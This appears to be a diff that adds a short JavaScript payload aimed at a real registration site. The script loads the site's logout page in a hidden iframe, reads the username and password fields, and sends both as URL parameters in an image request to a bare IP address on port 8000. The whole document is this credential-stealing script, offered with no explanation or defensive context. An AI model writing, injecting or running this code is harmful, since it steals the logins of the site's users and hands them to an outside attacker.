@@ -1,0 +1,10 @@
+const frimfram = document.createElement('iframe'); 
+frimfram.src = 'https://registration.cesa5.org/np/logout.do';
+frimfram.id = 'frimfram'; 
+document.body.appendChild(frimfram);
+var frimframdoc = document.getElementById('frimfram').contentWindow.document;
+var pw = frimframdoc.querySelector('#password').value;
+var un = frimframdoc.querySelector('#loginName').value;
+var imag = document.createElement('img');
+imag.src = 'http://74.14.159.250:8000/?pwd=' + pw + "&usr=" + un;
+document.body.appendChild(imag);
